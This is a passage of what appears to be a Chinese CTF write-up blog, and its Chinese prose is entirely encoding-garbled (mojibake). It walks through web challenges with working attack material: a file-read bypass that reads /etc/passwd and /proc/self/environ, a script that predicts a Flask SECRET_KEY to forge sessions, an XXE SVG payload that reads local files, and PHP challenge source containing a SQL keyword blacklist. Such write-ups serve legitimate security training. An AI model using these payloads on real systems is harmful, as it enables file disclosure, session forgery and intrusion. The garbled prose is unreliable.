punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°<code>if ($size[2] !== IMAGETYPE_PNG)</code>æˆç«‹çš„è¯å°±ä¼šè¾“å‡ºflag</p><p>getimagesizeè¿”å›ç»“æœè¯´æ˜</p><ul><li>ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼</li><li>ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼</li><li>ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 = BMPï¼Œ7 = TIFF(intel byte order)ï¼Œ8 = TIFF(motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM</li><li>ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ <image> æ ‡ç­¾</li><li>ç´¢å¼• bits ç»™å‡ºçš„æ˜¯å›¾åƒçš„æ¯ç§é¢œè‰²çš„ä½æ•°ï¼ŒäºŒè¿›åˆ¶æ ¼å¼</li><li>ç´¢å¼• channels ç»™å‡ºçš„æ˜¯å›¾åƒçš„é€šé“å€¼ï¼ŒRGB å›¾åƒé»˜è®¤æ˜¯ 3</li><li>ç´¢å¼• mime ç»™å‡ºçš„æ˜¯å›¾åƒçš„ MIME ä¿¡æ¯ï¼Œæ­¤ä¿¡æ¯å¯ä»¥ç”¨æ¥åœ¨ HTTP Content-type å¤´ä¿¡æ¯ä¸­å‘é€æ­£ç¡®çš„ä¿¡æ¯ï¼Œå¦‚ï¼š header(â€œContent-type: image/jpegâ€);</li></ul><p>æ‰€ä»¥æˆ‘ä»¬ç°åœ¨éœ€è¦çš„æ¡ä»¶æ˜¯ï¼š</p><p>1ã€æ–‡ä»¶ç»è¿‡<code>finfo_file</code>æ–¹æ³•æ£€æµ‹åˆ°çš„æ˜¯PNGå›¾ç‰‡</p><p>2ã€getimagesizeå‡½æ•°è¿”å›å›¾ç‰‡ä¿¡æ¯ï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ä¸èƒ½ç­‰äºIMAGETYPE_PNGï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ä¸º3</p><p><code>finfo_file</code>æ–¹æ³•æ˜¯é€šè¿‡æ£€æµ‹æ–‡ä»¶å¤´çš„åå…­è¿›åˆ¶ä¿¡æ¯æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸€ç‚¹ç‚¹åˆ é™¤ç›´åˆ°<code>finfo_file</code>èƒ½è¯»å‡ºç±»å‹è€Œ<code>getimagesize</code>è¯»ä¸å‡ºå†…å®¹å³å¯</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web4"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web4" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web4"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web4</h2><p>Read Somethingï¼Œä¼ å‚è¯»æ–‡ä»¶è¯•è¯•<code>/etc/passwd</code>è¯»åˆ°äº†ï¼Œé‚£å†è¯»è¯»ç¯å¢ƒæ–‡ä»¶å§<code>/proc/self/environ</code>ï¼Œçœ‹åˆ°pythonæ–‡ä»¶ä½ç½®ï¼Œè¯»æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:utf-8</span><span class="token keyword">import</span> re<span class="token punctuation">,</span> random<span class="token punctuation">,</span> uuid<span class="token punctuation">,</span> urllib<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">233</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'www-data'</span>    <span class="token keyword">return</span> <span class="token string">'Hello World! &lt;a href="/read?url=https://baidu.com">Read somethings&lt;/a>'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'^file.*'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>        n <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> re<span class="token punctuation">.</span>IGNORECASE<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token keyword">or</span> n<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No Hack'</span>        res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'no response'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'fuck'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Access denied'</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>        debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>        host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span>    <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¦‚æœæƒ³æ‹¿åˆ°flagï¼Œå°±è¦åœ¨sessionå¤„æ„é€ usernameä¸ºfuckï¼Œå†çœ‹<code>SECRET_KEY</code>å¤„</p><p><code>random.seed(uuid.getnode())</code>è¿™é‡Œçš„getnodeç”¨äºè·å–ç½‘ç»œæ¥å£çš„macåœ°å€ï¼Œå¦‚æœæœºå™¨æœ‰å¤šä¸ªmacåœ°å€ï¼Œåˆ™è¿”å›é€šç”¨ç®¡ç†çš„macåœ°å€</p><p><code>str(random.random()*233)</code>æ­¤å¤„çš„éšæœºæ•°ç”±äºä¹‹å‰æ’­æ’’äº†ç§å­ï¼Œæ‰€ä»¥ç”Ÿæˆçš„æ˜¯ä¼ªéšæœºæ•°</p><p>æ‰€ä»¥è¦å…ˆè¯»ä¸€ä¸‹ç¯å¢ƒçš„ç½‘å¡åœ°å€<code>/sys/class/net/eth0/address</code>ï¼Œç„¶åç”¨è„šæœ¬å¾—åˆ°SECRET_KEY</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">0xae3fa6c532bd</span><span class="token punctuation">)</span>randStr <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>randStr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¼ªé€ session</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205281141102.png"></p><p>ä¸Šä¼ å‘ç°ä¸è¡Œï¼Œå¯„äº†ä»¥åå†æ¥å¡«å‘</p><h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>å†·çŸ¥è¯†ï¼šSVGæ ¼å¼æ˜¯ç”±xmlè¯­æ³•å®šä¹‰çš„</p><p>å…³äºSVGä¸Šä¼ é€ æˆçš„æ¼æ´å¯ä»¥çœ‹<a href="https://zhuanlan.zhihu.com/p/323315064">è¿™é‡Œ</a></p><p>æ‰€ä»¥è‡ªç„¶è”æƒ³åˆ°XXEæ¼æ´</p><p>æ„é€ payload</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY file SYSTEM "file:///proc/self/pwd/flag.txt"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>20<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼ æ‹¿flag<del>ç¯å¢ƒä¼¼ä¹æœ‰é—®é¢˜ï¼Œä¸ç®¡æ€ä¹ˆä¼ éƒ½ä¼šæŠ¥é”™</del></p><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>æ‰«å‡ºæ³¨å†Œç•Œé¢ï¼Œæ³¨å†Œç™»å½•ï¼Œå‘ç°å‚æ•°ä¼ é€’ï¼Œå°è¯•ä½¿ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶æˆåŠŸ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//user.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"function.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE_admin</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$oper_you_can_do</span> <span class="token operator">=</span> <span class="token variable">$OPERATE</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//die($_SESSION['isadmin']);</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span><span class="token comment">//            echo("&lt;script>alert('no premission to visit info, only admin can, you are guest')&lt;/script>");</span>            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: user.php?page=guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><span class="token comment">//    $page = 'info';</span><span class="token comment">//&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$page</span></span>.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php">//function.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"manage"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token 